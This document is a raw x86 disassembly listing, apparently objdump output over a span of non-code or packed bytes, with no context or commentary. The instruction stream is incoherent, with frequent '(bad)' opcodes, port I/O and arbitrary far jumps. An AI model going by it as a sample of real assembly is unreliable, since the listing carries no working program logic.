  41e049:	add    esp,DWORD PTR [eax+0x505bd7f]
  41e04f:	mov    WORD PTR [edx-0x7a],ss
  41e052:	sub    cl,BYTE PTR [ebp-0x629057c5]
  41e058:	push   cs
  41e059:	sti    
  41e05a:	clc    
  41e05b:	mov    ch,0x4f
  41e05d:	mov    ebx,0xa08285b5
  41e062:	jne    0x41e064
  41e064:	pop    es
  41e065:	adc    BYTE PTR [ecx],cl
  41e067:	(bad)  
  41e068:	das    
  41e069:	shl    DWORD PTR [eax],0x94
  41e06c:	sub    edx,ebx
  41e06e:	lds    eax,FWORD PTR [esi+0x5fc4cc70]
  41e074:	xchg   bh,cl
  41e076:	pop    eax
  41e077:	pusha  
  41e078:	iret   
  41e079:	jmp    0xd5584975
  41e07e:	ret    0x4a78
  41e081:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e082:	jge    0x41e01f
  41e084:	mov    bl,0x6f
  41e086:	cmp    eax,0x579cbf44
  41e08b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e08c:	or     esi,esi
  41e08e:	push   0x1e
  41e090:	dec    ebp
  41e091:	xchg   edi,eax
  41e092:	outs   dx,BYTE PTR ds:[esi]
  41e093:	test   al,0x41
  41e095:	fldcw  WORD PTR [ecx+0x20]
  41e098:	cmp    ah,BYTE PTR [edi+0x47718902]
  41e09e:	sti    
  41e09f:	mov    esp,0x73152642
  41e0a4:	add    eax,0x9a8a3bd2
  41e0a9:	xchg   esi,eax
  41e0aa:	test   DWORD PTR [ebp+ebx*8-0x7b],esp
  41e0ae:	bnd jae 0x41e0e2
  41e0b1:	mov    eax,ds:0xbfb503c3
  41e0b6:	lods   eax,DWORD PTR ds:[esi]
  41e0b7:	pop    es
  41e0b8:	enter  0x579d,0x2c
  41e0bc:	les    eax,FWORD PTR [ecx]
  41e0be:	fld    DWORD PTR [ecx]
  41e0c0:	push   0x30
  41e0c2:	mov    edi,esi
  41e0c4:	mov    DWORD PTR [esi],ebp
  41e0c6:	jnp    0x41e06f
  41e0c8:	aaa    
  41e0c9:	push   es
  41e0ca:	pop    ds
  41e0cb:	jecxz  0x41e06b
  41e0cd:	clc    
  41e0ce:	cld    
  41e0cf:	adc    bh,BYTE PTR [esi-0x1a]
  41e0d2:	push   0x753c2b2d
  41e0d7:	cmp    BYTE PTR [edi+esi*2],dl
  41e0da:	ffreep st(2)
  41e0dc:	leave  
  41e0dd:	cld    
  41e0de:	jge    0x41e0ac
  41e0e0:	fmul   st,st(4)
  41e0e2:	mov    ecx,DWORD PTR [eax+0x44]
  41e0e5:	jnp    0x41e157
  41e0e7:	pusha  
  41e0e8:	sbb    BYTE PTR [ebx-0x1c],al
  41e0eb:	or     DWORD PTR [edi],ebp
  41e0ed:	mov    dh,0x5d
  41e0ef:	aas    
  41e0f0:	(bad)  
  41e0f1:	cwde   
  41e0f2:	or     ecx,0x3dd959b5
  41e0f8:	lods   eax,DWORD PTR ds:[esi]
  41e0f9:	call   0x5edd:0xd4b4739d
  41e100:	or     edi,ecx
  41e102:	push   ss
  41e103:	add    dh,dh
  41e105:	mov    DWORD PTR [ecx-0x5b76fcd5],ebp
  41e10b:	mov    BYTE PTR [edx],al
  41e10d:	lea    ebp,[eax-0x63]
  41e110:	cmc    
  41e111:	daa    
  41e112:	push   esp
  41e113:	cmp    eax,0x9f43b173
  41e118:	stc    
  41e119:	je     0x41e0ae
  41e11b:	mov    BYTE PTR [edx+0x4865b243],bh
  41e121:	sub    ebp,DWORD PTR [ecx-0x6109c23]
  41e127:	adc    edx,0x1
  41e12a:	mov    dh,0x77
  41e12c:	clc    
  41e12d:	cdq    
  41e12e:	(bad)  
  41e130:	mov    bl,0xc8
  41e132:	test   al,0x4b
  41e134:	loope  0x41e0d9
  41e136:	je     0x41e119
  41e138:	stos   DWORD PTR es:[edi],eax
  41e139:	cwde   
  41e13a:	pusha  
  41e13b:	ja     0x41e158
  41e13d:	xor    DWORD PTR [edx],ecx
  41e13f:	imul   edx,DWORD PTR [eax+0x5c],0xd5af8b1c
  41e146:	pop    ebp
  41e147:	ss test esp,ebx
  41e14a:	inc    ebp
  41e14b:	call   0x9721beaa
  41e150:	mov    ah,0x39
  41e152:	sbb    bl,cl
  41e154:	mov    al,0x3b
  41e156:	dec    edi
  41e157:	pop    ss
  41e158:	js     0x41e1a4
  41e15a:	sub    al,0x44
  41e15c:	(bad)  
  41e15d:	(bad)  
  41e15e:	ret    0xe242
  41e161:	inc    ebp
  41e162:	mov    fs,WORD PTR es:[edx+0x1133944c]
  41e169:	push   ebp
  41e16a:	retf   0xc3de
  41e16d:	fcmovb st,st(2)
  41e16f:	mov    edx,0x55649eb4
  41e174:	pop    ebx
  41e175:	pusha  
  41e176:	aam    0x4a
  41e178:	fcmove st,st(0)
  41e17a:	(bad)  
  41e17b:	int    0xe1
  41e17d:	cld    
  41e17e:	daa    
  41e17f:	rcl    BYTE PTR [esi+esi*4-0x4d],0x28
  41e184:	cmp    esi,DWORD PTR [ecx]
  41e186:	repnz aaa 
  41e188:	pop    ds
  41e189:	push   es
  41e18a:	outs   dx,BYTE PTR ds:[esi]
  41e18b:	js     0x41e14b
  41e18d:	cmp    BYTE PTR [esi+0x5a],dl
  41e190:	or     DWORD PTR [ecx+ecx*8+0xdf5c078],0x6e61bf0b
  41e19b:	cmp    cl,BYTE PTR [edi+eiz*8+0x11c00e9d]
  41e1a2:	push   ebx
  41e1a3:	push   0xffffff9c
  41e1a5:	in     eax,0x94
  41e1a7:	xchg   esp,eax
  41e1a8:	clc    
  41e1a9:	inc    eax
  41e1aa:	mov    esi,0x106aa563
  41e1af:	dec    esp
  41e1b0:	push   esi
  41e1b1:	mov    edx,0xa3754aa1
  41e1b6:	mov    cl,0x4b
  41e1b8:	push   ebp
  41e1b9:	outs   dx,BYTE PTR ds:[esi]
  41e1ba:	pusha  
  41e1bb:	outs   dx,BYTE PTR ss:[esi]
  41e1bd:	dec    ebp
  41e1be:	mov    al,ds:0x8a57165c
  41e1c3:	shl    ecx,0xa8
  41e1c6:	mov    al,0xe4
  41e1c8:	sub    eax,0xd9280a26
  41e1cd:	in     eax,0x76
  41e1cf:	add    al,0x87
  41e1d1:	fisubr WORD PTR [ecx+0x543d7c73]
  41e1d7:	leave  
  41e1d8:	stos   DWORD PTR es:[edi],eax
  41e1d9:	gs mov ecx,0x40539a70
  41e1df:	out    dx,al
  41e1e0:	cmp    edi,0x28
  41e1e3:	out    0xee,eax
  41e1e5:	scas   eax,DWORD PTR es:[edi]
  41e1e6:	pop    ss
  41e1e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e1e8:	add    ch,cl
  41e1ea:	hlt    
  41e1eb:	retf   
  41e1ec:	rol    BYTE PTR [ebx+0xcb21b78],cl
  41e1f2:	pop    eax
  41e1f3:	push   0x5c
  41e1f5:	enter  0x90f3,0x71
  41e1f9:	sahf   
  41e1fa:	sbb    bl,BYTE PTR [ebp+0x15]
  41e1fd:	or     bh,BYTE PTR [ecx+0x56]
  41e200:	lds    edx,FWORD PTR [ecx]
  41e202:	pop    esi
  41e203:	test   BYTE PTR [ebx-0x2e],bh
  41e206:	cdq    
  41e207:	ja     0x41e19f
  41e209:	ja     0x41e237
  41e20b:	retf   0xac41
  41e20e:	inc    edx
  41e20f:	jg     0x41e1be
  41e211:	adc    BYTE PTR [eax+0x3d],0x91
  41e215:	mov    al,0xe9
  41e217:	enter  0xc869,0x77
  41e21b:	xor    esi,DWORD PTR [eax+edi*8]
  41e21e:	push   ebp
  41e21f:	cdq    
  41e220:	or     BYTE PTR [ebx],ch
  41e222:	inc    esi
  41e223:	stos   DWORD PTR es:[edi],eax
  41e224:	stos   DWORD PTR es:[edi],eax
  41e225:	(bad)  [esi]
  41e227:	push   0x2e58f79e
  41e22c:	and    eax,0xc265c5f5
  41e231:	jns    0x41e290
  41e233:	or     eax,0xda5acee8
  41e238:	lods   al,BYTE PTR ds:[esi]
  41e239:	mov    esp,0x6aa3852b
  41e23e:	call   ecx
  41e240:	rcl    DWORD PTR ds:0xa20102a6,cl
  41e246:	call   0x5ee855b7
  41e24b:	fwait
  41e24c:	cmp    al,0xe1
  41e24e:	(bad)  
  41e24f:	pushf  
  41e250:	jns    0x41e295
  41e252:	and    DWORD PTR [edi],eax
  41e254:	rol    BYTE PTR [edi+0x4c],0xe6
  41e258:	add    DWORD PTR [ebx],ecx
  41e25a:	out    0x1e,eax
  41e25c:	pop    ebx
  41e25d:	sti    
  41e25e:	mov    ds:0xdf842873,eax
  41e263:	popa   
  41e264:	scas   eax,DWORD PTR es:[edi]
  41e265:	pop    ss
  41e266:	sar    BYTE PTR [eax-0x20555f7a],0x75
  41e26d:	xchg   edx,eax
  41e26e:	fistp  DWORD PTR [eax]
  41e270:	xchg   edx,eax
  41e271:	jnp    0x41e21a
  41e273:	fwait
  41e274:	std    
  41e275:	aad    0x56
  41e277:	add    BYTE PTR [ecx-0x78],bl
  41e27a:	sbb    al,0x81
  41e27c:	push   es
  41e27d:	loop   0x41e241
  41e27f:	or     al,BYTE PTR [ebx]
  41e281:	out    0x70,al
  41e283:	xchg   edx,eax
  41e284:	push   0x5a
  41e286:	jecxz  0x41e20b
  41e288:	loopne 0x41e2d4
  41e28a:	add    eax,0x555b8366
  41e28f:	or     ebp,DWORD PTR [ebx-0x473c62e3]
  41e295:	sbb    eax,0xf8c75bf0
  41e29a:	bound  edi,QWORD PTR [edi]
  41e29c:	cmp    eax,0x6ad19e73
  41e2a1:	mov    al,0x2a
  41e2a3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e2a4:	sbb    dl,0x14
  41e2a7:	rol    DWORD PTR [edx+0x78a337ee],cl
  41e2ad:	out    0xe3,al
  41e2af:	inc    esp
  41e2b0:	mov    al,0xfc
  41e2b2:	push   esi
  41e2b3:	pop    ecx
  41e2b4:	(bad)  es:[edx-0x13b8e156]
  41e2bb:	arpl   dx,bx
  41e2bd:	or     al,0x52
  41e2bf:	mov    dh,cl
  41e2c1:	pop    eax
  41e2c2:	fs inc esp
  41e2c4:	cdq    
  41e2c5:	adc    bh,BYTE PTR [ebx-0x9615120]
  41e2cb:	inc    edi
  41e2cc:	push   0xffffffb9
  41e2ce:	xor    esi,DWORD PTR [edx-0x40fa90bc]
  41e2d4:	loopne 0x41e2d9
  41e2d6:	adc    al,0xca
  41e2d8:	or     BYTE PTR [edi+0x62],al
  41e2db:	mov    WORD PTR [ecx-0x3906653e],cs
  41e2e1:	mov    esi,0xc47af668
  41e2e6:	loope  0x41e2ed
  41e2e8:	jle    0x41e283
  41e2ea:	xchg   eax,edx
  41e2ec:	inc    ecx
  41e2ed:	adc    DWORD PTR [ebx-0x1c936b4c],ebp
  41e2f3:	and    eax,0x16e0f820
  41e2f8:	xor    edx,edi
  41e2fa:	in     eax,dx
  41e2fb:	gs xchg edx,eax
  41e2fd:	xlat   BYTE PTR ds:[ebx]
  41e2fe:	add    eax,0x3236a31
  41e303:	jbe    0x41e2dd
  41e305:	out    dx,eax
  41e306:	pop    eax
  41e307:	outs   dx,BYTE PTR ds:[esi]
  41e308:	adc    al,0x29
  41e30a:	pop    esi
  41e30b:	push   DWORD PTR [eax+0x57b8882e]
  41e311:	bnd jge 0x41e2c2
  41e314:	sub    al,0xf4
  41e316:	ss pop edx
  41e318:	inc    edi
  41e319:	dec    edi
  41e31a:	xchg   BYTE PTR ds:0xbc4f22e,bh
  41e320:	mov    bh,0x3e
  41e322:	dec    ebp
  41e323:	rcl    ebp,0xf5
  41e326:	adc    esi,edi
  41e328:	sub    al,0x14
  41e32a:	sbb    eax,0x91942c8a
  41e32f:	push   ebx
  41e330:	mov    ebx,0xa1f81722
  41e335:	push   ss
  41e336:	adc    DWORD PTR [ebx],esp
  41e338:	jno    0x41e2bd
  41e33a:	inc    ebp
  41e33b:	push   ebp
  41e33c:	sahf   
  41e33d:	cs mov edi,0xba2a23c7
  41e343:	aaa    
  41e344:	inc    esp
  41e345:	xrelease xchg DWORD PTR [edx],ecx
  41e348:	(bad)  
  41e349:	and    bl,BYTE PTR ss:[ecx+0x74047c6]
  41e350:	and    DWORD PTR [edx-0x51],esi
  41e353:	jge    0x41e393
  41e355:	jbe    0x41e36c
  41e357:	and    dh,BYTE PTR [eax-0x1f]
  41e35a:	ret    0xabe4
  41e35d:	outs   dx,BYTE PTR ds:[esi]
  41e35e:	sbb    al,0x4f
  41e360:	or     eax,0x7ad42735
  41e365:	jmp    0xcfce:0x7508b8a4
  41e36c:	inc    ecx
  41e36d:	out    dx,eax
  41e36e:	lock ficomp DWORD PTR [edi]
  41e371:	sub    eax,0x5ff73208
  41e376:	fucompp 
  41e378:	(bad)  
  41e379:	repz push ebp
  41e37b:	fldenv [ecx+0x51]
  41e37e:	lods   al,BYTE PTR ds:[esi]
  41e37f:	mov    ebx,0x662ca625
  41e384:	mov    dh,0xf5
  41e386:	inc    esp
  41e387:	dec    ebp
  41e388:	dec    edx
  41e389:	je     0x41e31c
  41e38b:	test   al,0xfd
  41e38d:	mov    bl,0xdd
  41e38f:	and    eax,0x695dcd9d
  41e394:	pop    esp
  41e395:	lds    eax,FWORD PTR [ebx]
  41e397:	lea    ecx,[eax-0x69]
  41e39a:	cmp    al,0xc5
  41e39c:	outs   dx,DWORD PTR ds:[esi]
  41e39d:	inc    eax
  41e39e:	arpl   di,cx
  41e3a0:	lds    ebx,FWORD PTR [edx]
  41e3a2:	call   0xeb17:0x232980d7
  41e3a9:	mov    edi,0x1ba54483
  41e3ae:	xchg   ecx,eax
  41e3af:	clc    
  41e3b0:	jmp    0x41e38c
  41e3b2:	or     BYTE PTR [ebx-0x5a14476],bh
  41e3b8:	test   al,0x21
  41e3ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e3bb:	int    0xe7
  41e3bd:	and    bh,cl
  41e3bf:	fist   WORD PTR [ecx]
  41e3c1:	sub    al,bh
  41e3c3:	mov    ecx,0xe58f93e6
  41e3c8:	stos   DWORD PTR es:[edi],eax
  41e3c9:	sbb    DWORD PTR [ebp-0x578d76c2],eax
  41e3cf:	pop    ebp
  41e3d0:	xchg   BYTE PTR [ecx+esi*4-0x13f73244],ah
  41e3d7:	fs sub al,0x61
  41e3da:	popf   
  41e3db:	repz fmul DWORD PTR [ebx+eiz*2-0x76]
  41e3e0:	fs pop esi
  41e3e2:	xchg   edi,eax
  41e3e3:	psubsb mm0,QWORD PTR [eax+0x6f649ce9]
  41e3ea:	addr16 mov ah,0x83
  41e3ed:	nop
  41e3ee:	pop    es
  41e3ef:	nop
  41e3f0:	dec    eax
  41e3f1:	inc    eax
  41e3f2:	sar    DWORD PTR [ecx+edi*2-0x2f6f3546],1
  41e3f9:	add    ebx,DWORD PTR [ecx]
  41e3fb:	jno    0x41e436
  41e3fd:	mov    WORD PTR [ebx-0x188bb23d],ss
  41e403:	fsubr  DWORD PTR [eax-0x3a]
  41e406:	xchg   BYTE PTR [eax-0x4d],bh
  41e409:	je     0x41e407
  41e40b:	arpl   WORD PTR [esi+0x41],cx
  41e40e:	xchg   ecx,eax
  41e40f:	outs   dx,DWORD PTR ds:[esi]
  41e410:	pop    ss
  41e411:	mov    eax,0x42e4c2b4
  41e416:	sbb    esi,DWORD PTR [ebx+eax*4-0x76b4b993]
  41e41d:	add    DWORD PTR [esi+0x3a02047],esp
  41e423:	iret   
  41e424:	mov    ebp,ecx
  41e426:	scas   al,BYTE PTR es:[edi]
  41e427:	cwde   
  41e428:	sahf   
  41e429:	hlt    
  41e42a:	clc    
  41e42b:	sub    DWORD PTR [edi],esp
  41e42d:	xor    ebx,DWORD PTR [ecx]
  41e42f:	cdq    
  41e430:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e431:	mov    al,0x60
  41e433:	idiv   DWORD PTR [esi-0xdf660c0]
  41e439:	mov    gs,esi
  41e43b:	rcr    BYTE PTR [edx],cl
  41e43d:	xchg   edx,eax
  41e43e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e43f:	dec    ecx
  41e440:	(bad)  
  41e441:	lods   al,BYTE PTR ds:[esi]
  41e442:	push   es
  41e443:	aad    0xd
  41e445:	test   eax,0x8dcca216
  41e44a:	in     eax,dx
  41e44b:	or     BYTE PTR [eax+edx*4+0x63f9e960],cl
  41e452:	jae    0x41e43d
  41e454:	sub    cl,BYTE PTR [ecx-0x5e305f04]
  41e45a:	or     eax,0xe19bdac7
  41e45f:	jmp    0x783e:0x6894677
  41e466:	sahf   
  41e467:	popa   
  41e468:	hlt    
  41e469:	adc    al,0xd7
  41e46b:	mov    eax,0x1a2dfd52
  41e470:	out    0xe3,eax
  41e472:	loope  0x41e43b
  41e474:	fisttp DWORD PTR [edi+0x2b]
  41e477:	dec    ecx
  41e478:	ror    eax,1
  41e47a:	xchg   edx,eax
  41e47b:	in     eax,0xd6
  41e47d:	adc    eax,0xefc68e3c
  41e482:	imul   edx,DWORD PTR [edi+ebx*1-0x656688fa],0xb8ab0e7b
  41e48d:	shl    BYTE PTR [ecx+0x5a],0x1
  41e491:	jno    0x41e4b5
  41e493:	gs ds aad 0x2e
  41e497:	mov    ebp,0xb8d26343
  41e49c:	div    BYTE PTR [ebx]
  41e49e:	cmp    DWORD PTR [ebp+edi*2+0x66],esp
  41e4a2:	push   0xed8f13e7
  41e4a7:	sahf   
  41e4a8:	retf   
  41e4a9:	adc    BYTE PTR [ebx-0x143f4532],dl
  41e4af:	mov    bl,0xad
  41e4b2:	dec    ebp
  41e4b3:	push   esp
  41e4b4:	sbb    al,0x20
  41e4b6:	(bad)  
  41e4b7:	imul   ebx,DWORD PTR [edx-0x31c5962f],0x42
  41e4be:	les    esi,FWORD PTR [edx+0x3dd00592]
  41e4c4:	hlt    
  41e4c5:	xchg   ebp,eax
  41e4c6:	inc    eax
  41e4c7:	clc    
  41e4c8:	mov    eax,ds:0xc09ac66a
  41e4cd:	sbb    al,0xd1
  41e4cf:	imul   esi,DWORD PTR [esi],0xb7f227e6
  41e4d5:	xor    esi,esp
  41e4d7:	add    ebx,esi
  41e4d9:	push   DWORD PTR [ebx]
  41e4db:	xor    BYTE PTR [edx+0x408c3ef],dl
  41e4e1:	mov    esi,0x9e86c6e3
  41e4e6:	push   ebx
  41e4e7:	data16 cmp al,BYTE PTR [bx+di+0x54c4]
  41e4ed:	retf   
  41e4ee:	ror    BYTE PTR [esi+eax*8+0x2cf3ad66],1
  41e4f5:	dec    esi
  41e4f6:	cmp    eax,0x1ac63d5a
  41e4fb:	push   edx
  41e4fc:	daa    
  41e4fd:	cmp    al,0x15
  41e4ff:	rcr    BYTE PTR [edx-0x4f],cl
  41e502:	test   BYTE PTR ds:0xe1d452e1,dh
  41e508:	in     al,dx
  41e509:	push   esp
  41e50a:	dec    esp
  41e50b:	adc    DWORD PTR [esi-0x12],0xa233f59c
  41e512:	pop    esi
  41e513:	jle    0x41e582
  41e515:	or     ah,0xc7
  41e518:	xlat   BYTE PTR ds:[ebx]
  41e519:	cmp    bh,BYTE PTR ds:0x8b1666b
  41e51f:	ror    edi,0x6
  41e522:	xor    edx,DWORD PTR [esi+eax*4]
  41e525:	xlat   BYTE PTR ds:[ebx]
  41e526:	mov    dh,dh
  41e528:	sub    BYTE PTR [esi-0x49],dh
  41e52b:	lods   eax,DWORD PTR ds:[esi]
  41e52c:	pop    DWORD PTR [edi+0x1da5eb29]
  41e532:	jo     0x41e4c3
  41e534:	aas    
  41e535:	rcr    BYTE PTR [edi],1
  41e537:	cmp    BYTE PTR [ecx],ch
  41e539:	fmul   QWORD PTR [ebp-0x7a]
  41e53c:	pop    ecx
  41e53d:	ja     0x41e55b
  41e53f:	xor    DWORD PTR [edx+0x0],ebp
  41e542:	push   eax
  41e543:	into   
  41e544:	pusha  
  41e545:	xor    edx,edi
  41e547:	sub    al,0x6
  41e549:	adc    ch,bl
  41e54b:	cmp    BYTE PTR [ecx+0x54821d40],dl
  41e551:	jns    0x41e552
  41e553:	xchg   ecx,eax
  41e554:	or     BYTE PTR [ebp+eax*2-0x80],al
  41e558:	dec    esp
  41e559:	in     al,dx
  41e55a:	aaa    
  41e55b:	scas   al,BYTE PTR es:[edi]
  41e55c:	je     0x41e543
  41e55e:	cmp    DWORD PTR [eax],ecx
  41e560:	add    esp,ecx
  41e562:	xor    DWORD PTR [ebp+0x67],edi
  41e565:	pop    edx
  41e566:	pop    esi
  41e567:	add    ecx,DWORD PTR [ebx-0x735b84f8]
  41e56d:	mov    dl,0x88
  41e56f:	xchg   esi,eax
  41e570:	add    eax,0xea94dddf
  41e575:	aas    
  41e576:	push   esp
  41e577:	popa   
  41e578:	popf   
  41e579:	addr16 adc eax,0x40f12a2d
  41e57f:	mov    bl,0x7d
  41e581:	aas    
  41e582:	test   ch,dh
  41e584:	lods   al,BYTE PTR ds:[esi]
  41e585:	lea    esi,[esi-0x54816c55]
  41e58b:	or     al,0xab
  41e58d:	ret    
  41e58e:	cmc    
  41e58f:	lods   al,BYTE PTR ds:[esi]
  41e590:	sub    DWORD PTR [edx],edx
  41e592:	aam    0x5f
  41e594:	push   es
  41e595:	daa    
  41e596:	cmp    al,0x86
  41e598:	shl    DWORD PTR [eax-0x5a3caea8],cl
  41e59e:	cmp    BYTE PTR [ecx],ah
  41e5a0:	sbb    al,0x7c
  41e5a2:	jge    0x41e548
  41e5a4:	in     al,0xda
  41e5a6:	jp     0x41e5f5
  41e5a8:	stc    
  41e5a9:	or     eax,0x57
  41e5ac:	cmp    BYTE PTR [ebx+ebp*8],bh
  41e5af:	mov    es:0xce561032,al
  41e5b5:	or     eax,0x37468d52
  41e5ba:	adc    BYTE PTR ds:0x44d404d4,al
  41e5c0:	push   es
  41e5c1:	sub    bh,BYTE PTR [edi+0x16]
  41e5c4:	mov    al,ds:0x29c7bf66
  41e5c9:	cmp    esi,DWORD PTR [esp+ecx*2-0x3b]
  41e5cd:	mov    al,0x28
  41e5cf:	sub    BYTE PTR [ecx+ebp*4],ah
  41e5d2:	shr    DWORD PTR [eax+0x56413111],1
  41e5d8:	push   ecx
  41e5d9:	es push eax
  41e5db:	mov    edi,0x566e7028
  41e5e0:	cmp    DWORD PTR [ecx-0x18811a73],0x1c70ca45
  41e5ea:	ror    BYTE PTR [edx+0x7b],cl
  41e5ed:	loope  0x41e669
  41e5ef:	push   es
  41e5f0:	xor    bl,BYTE PTR [edx+0x62]
  41e5f3:	sbb    DWORD PTR [eax+0x722f6d37],ebx
  41e5f9:	into   
  41e5fa:	loope  0x41e62b
  41e5fc:	popa   
  41e5fd:	cmp    al,0x74
  41e5ff:	or     eax,0x456a667
  41e604:	rcr    BYTE PTR [eax+0x2d],cl
  41e607:	cwde   
  41e608:	hlt    
  41e609:	std    
  41e60a:	cli    
  41e60b:	or     eax,0xebc32b4e
  41e610:	scas   al,BYTE PTR es:[edi]
  41e611:	mov    ebp,0x4ab34a17
  41e616:	push   edx
  41e617:	and    al,0x73
  41e61a:	dec    edx
  41e61b:	inc    ebp
  41e61c:	ds (bad) 
  41e61e:	xchg   ebp,eax
  41e61f:	retf   0x237b
  41e622:	outs   dx,BYTE PTR ds:[esi]
  41e623:	push   cs
  41e624:	or     dl,BYTE PTR [ecx+0x4b]
  41e627:	sbb    al,0x57
  41e629:	scas   al,BYTE PTR es:[edi]
  41e62a:	fstp   QWORD PTR [eax+0x54]
  41e62d:	scas   eax,DWORD PTR es:[edi]
  41e62e:	arpl   ax,sp
  41e630:	clc    
  41e631:	mov    BYTE PTR [esi+0x32],dl
  41e634:	in     al,dx
  41e635:	jb     0x41e641
  41e637:	das    
  41e638:	and    bh,BYTE PTR [edx]
  41e63a:	dec    edx
  41e63b:	es inc esp
  41e63d:	inc    edi
  41e63e:	scas   al,BYTE PTR es:[edi]
  41e63f:	mov    dl,0xb0
  41e641:	bsf    ecx,DWORD PTR [esi-0x11]
  41e645:	lods   al,BYTE PTR ds:[esi]
  41e646:	sub    eax,0x148a14ef
  41e64b:	in     al,dx
  41e64c:	sbb    ebp,DWORD PTR [ebp-0x1e]
  41e64f:	lea    eax,[eax-0x24]
  41e652:	(bad)  
  41e653:	arpl   WORD PTR [eax-0x71],sp
  41e656:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e657:	daa    
  41e658:	cmovs  esp,ebx
  41e65b:	pop    ecx
  41e65c:	sbb    dl,ah
  41e65e:	in     eax,0xa0
  41e660:	sub    DWORD PTR [edx],0x6f9d62e9
  41e666:	and    ebx,DWORD PTR [edx]
  41e668:	pop    esp
  41e669:	pop    ss
  41e66a:	mov    al,ds:0xbd34a571
  41e66f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e670:	jo     0x41e60e
  41e672:	sbb    DWORD PTR [eax],eax
  41e674:	bound  eax,QWORD PTR [esi]
  41e676:	mov    cl,0x52
  41e678:	shr    BYTE PTR [edi-0x70084ace],1
  41e67e:	and    ch,ch
  41e680:	add    BYTE PTR [edx+0x6712d24f],0xac
  41e687:	jp     0x41e672
  41e689:	rol    BYTE PTR [edi],0x99
  41e68c:	idiv   BYTE PTR gs:[ecx+0x7b]
  41e690:	push   cs
  41e691:	bound  esi,QWORD PTR [ebp-0x64]
  41e694:	add    BYTE PTR [ebx],dl
  41e696:	idiv   bh
  41e698:	push   esi
  41e699:	push   eax
  41e69a:	and    ebx,DWORD PTR ss:[eax]
  41e69d:	xchg   ah,bl
  41e69f:	les    edi,FWORD PTR [ebp+0x66fdaa43]
  41e6a5:	mov    edi,0x8f18c436
  41e6aa:	add    DWORD PTR [esi+0x60],0x28
  41e6ae:	fsubr  DWORD PTR [eax]
  41e6b0:	nop
  41e6b1:	or     eax,0xa1770e06
  41e6b6:	inc    ebp
  41e6b7:	adc    BYTE PTR [edi],cl
  41e6b9:	push   ds
  41e6ba:	cmp    al,0xb
  41e6bc:	jnp    0x41e736
  41e6be:	mov    esi,0x7be8ccb2
  41e6c3:	add    eax,0xbd1e8ebf
  41e6c8:	add    eax,0xe87982a1
  41e6cd:	shr    BYTE PTR [ecx],0x86
  41e6d0:	push   edx
  41e6d1:	adc    eax,0x4d780fae
  41e6d6:	loopne 0x41e725
  41e6d8:	(bad)  
  41e6da:	sub    al,0xcb
  41e6dc:	mov    eax,ds:0x7286c956
  41e6e1:	xchg   esp,eax
  41e6e2:	popf   
  41e6e3:	and    BYTE PTR [edx-0x22],0x6d
  41e6e7:	adc    al,0x56
  41e6e9:	xchg   edi,eax
  41e6ea:	pop    eax
  41e6eb:	pop    ebx
  41e6ec:	jp     0x41e6ba
  41e6ee:	mov    bl,0x61
  41e6f0:	data16 mov ds:0xb199c327,al
  41e6f6:	sahf   
  41e6f7:	pop    esi
  41e6f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e6f9:	jno    0x41e76b
  41e6fb:	cmp    eax,0xd6e6eb8c
  41e700:	or     bl,ah
  41e702:	push   ss
  41e703:	lock int3 
  41e705:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e706:	adc    al,0xfc
  41e708:	ds (bad) 
  41e70a:	in     al,0x5b
  41e70c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e70d:	(bad)  
  41e70e:	jae    0x41e75e
  41e710:	push   es
  41e711:	adc    ch,bl
  41e713:	push   edi
  41e714:	jbe    0x41e6f2
  41e716:	enter  0x5cec,0xf8
  41e71a:	imul   esp,edx,0x7b
  41e71d:	into   
  41e71e:	mov    ?,WORD PTR [eax+ecx*8+0x6d]
  41e722:	jecxz  0x41e6c9
  41e724:	fistp  WORD PTR [edi-0x55]
  41e727:	mov    esi,0xd17cf22
  41e72c:	dec    ecx
  41e72d:	dec    ebp
  41e72e:	mov    BYTE PTR gs:[esp+eax*1-0x238447c8],bh
  41e736:	jl     0x41e6fa
  41e738:	xor    esi,DWORD PTR [edi]
  41e73a:	cmp    esi,DWORD PTR [eax]
  41e73c:	xor    ch,BYTE PTR [esi+0x1b]
  41e73f:	test   BYTE PTR [ecx+0x1a],bh
  41e742:	lods   al,BYTE PTR ds:[esi]
  41e743:	xchg   ecx,eax
  41e744:	leave  
  41e745:	sbb    cl,BYTE PTR [esi-0x1f]
  41e748:	xchg   ebx,eax
  41e749:	popa   
  41e74a:	adc    DWORD PTR [ebx+edx*8],esi
  41e74d:	xor    eax,0xbf618440
  41e752:	fidiv  WORD PTR [ecx+0x4baeb05e]
  41e758:	dec    esi
  41e759:	jne    0x41e74a
  41e75b:	mov    DWORD PTR [esi+0x78],esp
  41e75e:	xor    ecx,edi
  41e760:	enter  0x5d08,0x95
  41e764:	(bad)  
  41e765:	fisub  WORD PTR [ecx-0x39]
  41e768:	mov    ecx,DWORD PTR [edi]
  41e76a:	mov    gs,WORD PTR [edi+edi*1]
  41e76d:	sub    DWORD PTR es:[esi+eax*2],0xe99be52
  41e775:	mov    ds:0xdedbaf81,al
  41e77a:	xchg   ebp,eax
  41e77b:	mov    eax,0xde9431cf
  41e780:	xchg   ebp,eax
  41e781:	ds push esp
  41e783:	js     0x41e72d
  41e785:	pop    ecx
  41e786:	jns    0x41e768
  41e788:	adc    BYTE PTR [eax],al
  41e78a:	cmp    ch,BYTE PTR [eax+0x5d]
  41e78d:	add    esp,ecx
  41e78f:	stos   DWORD PTR es:[edi],eax
  41e790:	mov    ds:0x5bf05767,al
  41e795:	xor    dh,dl
  41e797:	or     BYTE PTR [ebp+ebx*2-0x25],cl
  41e79b:	or     BYTE PTR [edx+0x61],al
  41e79e:	repz jb 0x41e7fc
  41e7a1:	inc    edi
  41e7a2:	mov    eax,0xfcda6039
  41e7a7:	fdiv   st(0),st
  41e7a9:	std    
  41e7aa:	int3   
  41e7ab:	jge    0x41e7a9
